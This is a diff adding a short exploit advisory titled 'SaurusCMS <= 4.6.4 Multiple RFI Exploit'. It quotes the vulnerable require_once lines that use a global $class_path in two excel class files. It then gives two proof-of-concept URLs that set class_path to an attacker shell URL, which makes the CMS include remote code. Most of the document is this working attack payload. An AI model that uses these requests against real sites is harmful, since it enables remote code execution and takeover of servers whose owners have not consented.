@@ -1,0 +1,35 @@
+##################################################################
+## Exploit Title: SaurusCMS <= 4.6.4 Multiple RFI Exploit       ##
+## Date: 19-12-2009                                             ##
+## Author: cr4wl3r                                              ##
+## Software Link: http://www.saurus.info                        ##
+## Version: N/A                                                 ##
+## Tested on: GNU/LINUX                                         ##
+##################################################################
+
+
+~ Code [class.writeexcel_workbook.inc.php]
+
+global $class_path;
+
+require_once $class_path."excel/class.writeexcel_biffwriter.inc.php";
+require_once $class_path."excel/class.writeexcel_format.inc.php";
+//require_once "class.writeexcel_formula.inc.php";
+require_once $class_path."excel/class.writeexcel_olewriter.inc.php";
+
+
+~ PoC
+
+[SaurusCMS_path]/classes/excel/class.writeexcel_workbook.inc.php?class_path=[Shell]
+
+
+
+~ Code [class.writeexcel_worksheet.inc.php]
+
+global $class_path;
+require_once $class_path."excel/class.writeexcel_biffwriter.inc.php";
+
+
+~ PoC
+
+[SaurusCMS_path]/classes/excel/class.writeexcel_worksheet.inc.php?class_path=[Shell]
